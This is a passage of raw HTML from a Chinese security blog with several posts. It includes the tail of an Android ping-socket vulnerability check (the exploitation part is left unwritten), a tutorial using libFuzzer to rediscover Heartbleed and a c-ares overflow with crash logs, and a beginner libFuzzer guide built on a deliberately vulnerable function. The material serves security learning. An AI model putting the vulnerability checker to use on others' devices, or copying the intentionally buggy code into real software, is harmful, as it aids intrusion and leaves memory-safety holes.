其中disconnect的具体实现是根据协议类型而定的，PING（ICMP）socket的具体实现disconnect（）是</span></span><br><span class="line"><span class="comment">     * udp_disconnect（）未绑定端口的情况下会触发sk-&gt;sk_prot-&gt;unhash(sk)逻辑*/</span></span><br><span class="line">    connect(sock, (<span class="keyword">const</span> struct sockaddr *) &amp;sa, <span class="keyword">sizeof</span>(sa)); <span class="comment">// 如果漏洞存在，第二次调用就会触发这个漏洞</span></span><br><span class="line">    <span class="keyword">if</span> (*((<span class="keyword">long</span> *)(LIST_POISON)) != <span class="number">0xfefefefe</span>) &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;Device is vulnerable\n&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Device is not vulnerable\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在Android上编译调用。  </p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>后面再补充。。。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/koozxcv/article/details/50976884">http://blog.csdn.net/koozxcv/article/details/50976884</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/py_panyu/article/details/47378733">http://blog.csdn.net/py_panyu/article/details/47378733</a><br>Own your Android! Yet Another Universal Root</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/07/15/%E7%94%A8libFuzzer%E6%90%9E%E4%BA%8B%E6%83%85/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/07/15/%E7%94%A8libFuzzer%E6%90%9E%E4%BA%8B%E6%83%85/" class="post-title-link" itemprop="url">用libFuzzer搞事情</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-07-15 23:41:39" itemprop="dateCreated datePublished" datetime="2017-07-15T23:41:39+08:00">2017-07-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>前面一篇文章介绍过libFuzzer的基本用法了，本文就用libFuzzer来搞一些实际的事情。这里的学习还是以<a target="_blank" rel="noopener" href="https://github.com/Dor1s/libfuzzer-workshop">libfuzzer-workshop</a>这个系列教程为主。</p>
<h2 id="Heartbleed-Vulnerable-CVE-2014-0160"><a href="#Heartbleed-Vulnerable-CVE-2014-0160" class="headerlink" title="Heartbleed Vulnerable(CVE-2014-0160)"></a>Heartbleed Vulnerable(CVE-2014-0160)</h2><p><strong>编译有漏洞的openssl版本</strong> libfuzzer-workshop/lessons/05</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tar xzf openssl1.0.1f.tgz</span><br><span class="line">$ cd openssl1.0.1f</span><br><span class="line">$ .&#x2F;config</span><br><span class="line">$ make clean</span><br><span class="line">$ make CC&#x3D;&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize&#x3D;address -fsanitize-coverage&#x3D;trace-pc-guard,trace-cmp,trace-gep,trace-div&quot; -j$(nproc)</span><br></pre></td></tr></table></figure>
<p><strong>fuzzer实现</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CERT_PATH</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CERT_PATH</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">SSL_CTX *<span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SSL_library_init();</span><br><span class="line">  SSL_load_error_strings();</span><br><span class="line">  ERR_load_BIO_strings();</span><br><span class="line">  OpenSSL_add_all_algorithms();</span><br><span class="line">  SSL_CTX *sctx;</span><br><span class="line">  assert (sctx = SSL_CTX_new(TLSv1_method()));</span><br><span class="line">  <span class="comment">/* These two file were created with this command:</span></span><br><span class="line"><span class="comment">      openssl req -x509 -newkey rsa:512 -keyout server.key \</span></span><br><span class="line"><span class="comment">     -out server.pem -days 9999 -nodes -subj /CN=a/</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH <span class="string">&quot;server.pem&quot;</span>,</span><br><span class="line">                                      SSL_FILETYPE_PEM));</span><br><span class="line">  assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH <span class="string">&quot;server.key&quot;</span>,</span><br><span class="line">                                     SSL_FILETYPE_PEM));</span><br><span class="line">  <span class="keyword">return</span> sctx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *data, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> SSL_CTX *sctx = Init();</span><br><span class="line">  SSL *server = SSL_new(sctx);</span><br><span class="line">  BIO *sinbio = BIO_new(BIO_s_mem());</span><br><span class="line">  BIO *soutbio = BIO_new(BIO_s_mem());</span><br><span class="line">  SSL_set_bio(server, sinbio, soutbio);</span><br><span class="line">  SSL_set_accept_state(server);</span><br><span class="line">  BIO_write(sinbio, data, size);</span><br><span class="line">  SSL_do_handshake(server);</span><br><span class="line">  SSL_free(server);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fuzzer中用到了刚刚编译的openssl产生的库文件，代码中的API都是openssl库中的。<br><strong>编译运行fuzzer</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize&#x3D;address \</span><br><span class="line">-fsanitize-coverage&#x3D;trace-pc-guard,trace-cmp,trace-gep,trace-div \</span><br><span class="line">-Iopenssl1.0.1f&#x2F;include openssl1.0.1f&#x2F;libssl.a openssl1.0.1f&#x2F;libcrypto.a \</span><br><span class="line">..&#x2F;..&#x2F;libFuzzer&#x2F;libFuzzer.a -o openssl_fuzzer</span><br><span class="line">$ mkdir corpus1</span><br><span class="line">$ .&#x2F;openssl_fuzzer corpus1</span><br><span class="line">INFO: Seed: 4157502167</span><br><span class="line">INFO: Loaded 1 modules (36195 guards): [0xc19890, 0xc3ce1c),</span><br><span class="line">Loading corpus dir: corpus1</span><br><span class="line">INFO: -max_len is not provided, using 64</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#0    READ units: 1</span><br><span class="line">#1    INITED cov: 1527 ft: 413 corp: 1&#x2F;1b exec&#x2F;s: 0 rss: 33Mb</span><br><span class="line">#4    NEW    cov: 1533 ft: 444 corp: 2&#x2F;10b exec&#x2F;s: 0 rss: 34Mb L: 9 MS: 3 ChangeByte-ChangeBit-CMP- DE: &quot;\xff\xff\xff\xff\xff\xff\xff\xff&quot;-</span><br><span class="line">#111    NEW    cov: 1533 ft: 447 corp: 3&#x2F;28b exec&#x2F;s: 0 rss: 39Mb L: 18 MS: 5 ShuffleBytes-InsertByte-PersAutoDict-PersAutoDict-ChangeBit- DE: &quot;\xff\xff\xff\xff\xff\xff\xff\xff&quot;-&quot;\xff\xff\xff\xff\xff\xff\xff\xff&quot;-</span><br><span class="line">#1186    NEW    cov: 1536 ft: 463 corp: 4&#x2F;38b exec&#x2F;s: 0 rss: 84Mb L: 10 MS: 5 CopyPart-ChangeBit-InsertByte-CMP-CMP- DE: &quot;\xff\xff\xff\xff&quot;-&quot;\xfd\x03\x00\x00&quot;-</span><br><span class="line">...</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;11010&#x3D;&#x3D;ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x0000004c542c bp 0x7ffc92f1bac0 sp 0x7ffc92f1b270</span><br><span class="line">READ of size 65279 at 0x629000009748 thread T0</span><br><span class="line">    #0 0x4c542b in __asan_memcpy &#x2F;home&#x2F;fanrong&#x2F;Downloads&#x2F;src&#x2F;llvm&#x2F;projects&#x2F;compiler-rt&#x2F;lib&#x2F;asan&#x2F;asan_interceptors.cc:462</span><br><span class="line">    #1 0x5221b2 in tls1_process_heartbeat &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;Fuzz&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;05&#x2F;openssl1.0.1f&#x2F;ssl&#x2F;t1_lib.c:2586:3</span><br><span class="line">    #2 0x593639 in ssl3_read_bytes &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;Fuzz&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;05&#x2F;openssl1.0.1f&#x2F;ssl&#x2F;s3_pkt.c:1092:4</span><br><span class="line">    #3 0x597f23 in ssl3_get_message &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;Fuzz&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;05&#x2F;openssl1.0.1f&#x2F;ssl&#x2F;s3_both.c:457:7</span><br><span class="line">    #4 0x5604d9 in ssl3_get_client_hello &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;Fuzz&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;05&#x2F;openssl1.0.1f&#x2F;ssl&#x2F;s3_srvr.c:941:4</span><br><span class="line">    #5 0x55c4fc in ssl3_accept &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;Fuzz&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;05&#x2F;openssl1.0.1f&#x2F;ssl&#x2F;s3_srvr.c:357:9</span><br><span class="line">    #6 0x5158ac in LLVMFuzzerTestOneInput &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;Fuzz&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;05&#x2F;openssl_fuzzer.cc:39:3</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>如输出所示，<code>tls1_process_heartbeat</code>函数中发生了<code>heap-buffer-overflow</code>。可以看到模糊测试是非常有效的。</p>
<h2 id="c-ares-CVE-2016-5180"><a href="#c-ares-CVE-2016-5180" class="headerlink" title="c-ares(CVE-2016-5180)"></a>c-ares(CVE-2016-5180)</h2><p>接下来看一下<a target="_blank" rel="noopener" href="https://c-ares.haxx.se/">c-ares</a>的漏洞，这个漏洞已经被利用在ChromeOS上，以root权限<a target="_blank" rel="noopener" href="https://googlechromereleases.blogspot.com/2016/09/stable-channel-updates-for-chrome-os.html">远程代码执行</a>。<br><strong>编译有漏洞的c-ares版本</strong> libfuzzer-workshop/lessons/06</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tar xzvf c-ares.tgz</span><br><span class="line">$ cd c-ares</span><br><span class="line">$ .&#x2F;buildconf</span><br><span class="line">$ .&#x2F;configure CC&#x3D;&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize&#x3D;address -fsanitize-coverage&#x3D;trace-pc-guard,trace-cmp,trace-gep,trace-div&quot;</span><br><span class="line">$ make CFLAGS&#x3D;</span><br></pre></td></tr></table></figure>
<p><strong>fuzzer实现</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ares.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *data, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf;</span><br><span class="line">  <span class="keyword">int</span> buflen;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s</span><span class="params">(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;(data), size)</span></span>;</span><br><span class="line">  ares_create_query(s.c_str(), ns_c_in, ns_t_a, <span class="number">0x1234</span>, <span class="number">0</span>, &amp;buf, &amp;buflen, <span class="number">0</span>);</span><br><span class="line">  ares_free_string(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>编译运行fuzzer</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ clang++ -g c_ares_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize&#x3D;address \</span><br><span class="line">-fsanitize-coverage&#x3D;trace-pc-guard,trace-cmp,trace-gep,trace-div \</span><br><span class="line">-Ic-ares c-ares&#x2F;.libs&#x2F;libcares.a \</span><br><span class="line">..&#x2F;..&#x2F;libFuzzer&#x2F;libFuzzer.a -o c_ares_fuzzer</span><br><span class="line">$ mkdir corpus1</span><br><span class="line">$ .&#x2F;c_ares_fuzzer corpus1</span><br><span class="line">INFO: Seed: 4265518985</span><br><span class="line">INFO: Loaded 1 modules (63 guards): [0x7740f0, 0x7741ec),</span><br><span class="line">INFO: -max_len is not provided, using 64</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#0    READ units: 1</span><br><span class="line">#1    INITED cov: 20 ft: 17 corp: 1&#x2F;1b exec&#x2F;s: 0 rss: 26Mb</span><br><span class="line">#3    NEW    cov: 22 ft: 22 corp: 2&#x2F;3b exec&#x2F;s: 0 rss: 27Mb L: 2 MS: 2 ShuffleBytes-InsertByte-</span><br><span class="line">#5    NEW    cov: 25 ft: 29 corp: 3&#x2F;41b exec&#x2F;s: 0 rss: 27Mb L: 38 MS: 4 ShuffleBytes-InsertByte-EraseBytes-InsertRepeatedBytes-</span><br><span class="line">#7    NEW    cov: 25 ft: 31 corp: 4&#x2F;105b exec&#x2F;s: 0 rss: 27Mb L: 64 MS: 1 CrossOver-</span><br><span class="line">#15    NEW    cov: 25 ft: 35 corp: 5&#x2F;145b exec&#x2F;s: 0 rss: 27Mb L: 40 MS: 4 ShuffleBytes-CrossOver-CopyPart-CMP- DE: &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;-</span><br><span class="line">#25    NEW    cov: 25 ft: 39 corp: 6&#x2F;148b exec&#x2F;s: 0 rss: 27Mb L: 3 MS: 4 InsertByte-ChangeBit-ChangeByte-InsertByte-</span><br><span class="line">#27    NEW    cov: 25 ft: 43 corp: 7&#x2F;152b exec&#x2F;s: 0 rss: 27Mb L: 4 MS: 1 InsertByte-</span><br><span class="line">...</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;34918&#x3D;&#x3D;ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6040003344f4 at pc 0x000000516534 bp 0x7fff1814e3f0 sp 0x7fff1814e3e8</span><br><span class="line">WRITE of size 1 at 0x6040003344f4 thread T0</span><br><span class="line">    #0 0x516533 in ares_create_query &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;Fuzz&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;06&#x2F;c-ares&#x2F;ares_create_query.c:196:3</span><br><span class="line">    #1 0x51553f in LLVMFuzzerTestOneInput &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;Fuzz&#x2F;libfuzzer-workshop&#x2F;lessons&#x2F;06&#x2F;c_ares_fuzzer.cc:16:3</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>关于fuzzing还有很多高级话题，比如，如何改进fuzzer并分析其performance；种子语料库、自定义选项和其他一些因素都非常重要。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://github.com/Dor1s/libfuzzer-workshop/tree/master/lessons/05">https://github.com/Dor1s/libfuzzer-workshop/tree/master/lessons/05</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/07/15/libFuzzer%E8%8F%9C%E9%B8%9F%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/07/15/libFuzzer%E8%8F%9C%E9%B8%9F%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">libFuzzer菜鸟入门</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-07-15 14:47:25" itemprop="dateCreated datePublished" datetime="2017-07-15T14:47:25+08:00">2017-07-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>LibFuzzer是一个<code>in-process</code>，<code>coverage-guided</code>，<code>evolutionary</code>模糊测试引擎，是LLVM项目的一部分。LibFuzzer和要被测试的库链接在一起，通过一个特殊的模糊测试进入点（目标函数），用测试用例feed要被测试的库。fuzzer会跟踪哪些代码区域已经测试过，然后在输入数据的语料库上产生变异，来最大化代码覆盖。代码覆盖的信息由LLVM的SanitizerCoverage插桩提供。</p>
<blockquote>
<p>模糊测试种类：  </p>
</blockquote>
<ol>
<li>Generation Based：通过对目标协议或文件格式建模的方法，从零开始产生测试用例，没有先前的状态  </li>
<li>Mutation Based：基于一些规则，从已有的数据样本或存在的状态变异而来  </li>
<li>Evolutionary：产生或变异或两者都有，In-process有代码覆盖反馈</li>
</ol>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>我的测试环境是VMware+Ubuntu16.04 x64（官方推荐），一个最近版本的clang编译器，可以使用<a target="_blank" rel="noopener" href="https://github.com/Dor1s/libfuzzer-workshop/blob/master/checkout_build_install_llvm.sh">checkout_build_install_llvm.sh</a>这个脚本来安装。<br>其他依赖：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y make autoconf automake libtool pkg-config zlib1g-dev</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;Dor1s&#x2F;libfuzzer-workshop.git</span><br><span class="line">$ cd libfuzzer-workshop&#x2F;libFuzzer</span><br><span class="line">$ Fuzzer&#x2F;build.sh</span><br></pre></td></tr></table></figure>

<h2 id="编写fuzzer"><a href="#编写fuzzer" class="headerlink" title="编写fuzzer"></a>编写fuzzer</h2><p><strong>Fuzzer例子1</strong><br>考虑如下的函数(libfuzzer-workshop/lessons/04/vulnerable_functions.h)：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">VulnerableFunction1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">    result = data[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">1</span>] == <span class="string">&#x27;U&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">2</span>] == <span class="string">&#x27;Z&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">3</span>] == <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用下面的fuzz target来测试它：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *data, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    VulnerableFunction1(data, size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如下编译fuzzer</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ clang++ -g -std&#x3D;c++11 -fsanitize&#x3D;address -fsanitize-coverage&#x3D;trace-pc-guard \</span><br><span class="line">first_fuzzer.cc ..&#x2F;..&#x2F;libFuzzer&#x2F;libFuzzer.a \</span><br><span class="line">-o first_fuzzer</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Memory Tools  </p>
</blockquote>
<ol>
<li>AddressSanitizer：检测use-after-free, buffer overflows(heap, stack, globals), stack-use-after-return, container-overflow  </li>
<li>MemorySanitizer：检测uninitialized memory reads  </li>
<li>UndefinedBehaviorSanitizer：检测多种类别的bug，esp on type confusion, signed-integer-overflow, undefined shift, etc.</li>
</ol>
<p>建一个空的目录来存放语料库，运行fuzzer：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir corpus1</span><br><span class="line">$ .&#x2F;first_fuzzer corpus1</span><br><span class="line">INFO: Seed: 675115685</span><br><span class="line">INFO: Loaded 1 modules (39 guards): [0x773ea0, 0x773f3c),</span><br><span class="line">Loading corpus dir: corpus1</span><br><span class="line">INFO: -max_len is not provided, using 64</span><br><span class="line">#0    READ units: 4</span><br><span class="line">#4    INITED cov: 7 ft: 6 corp: 4&#x2F;131b exec&#x2F;s: 0 rss: 29Mb</span><br><span class="line">#100    NEW    cov: 7 ft: 7 corp: 5&#x2F;133b exec&#x2F;s: 0 rss: 29Mb L: 2 MS: 1 EraseBytes-</span><br><span 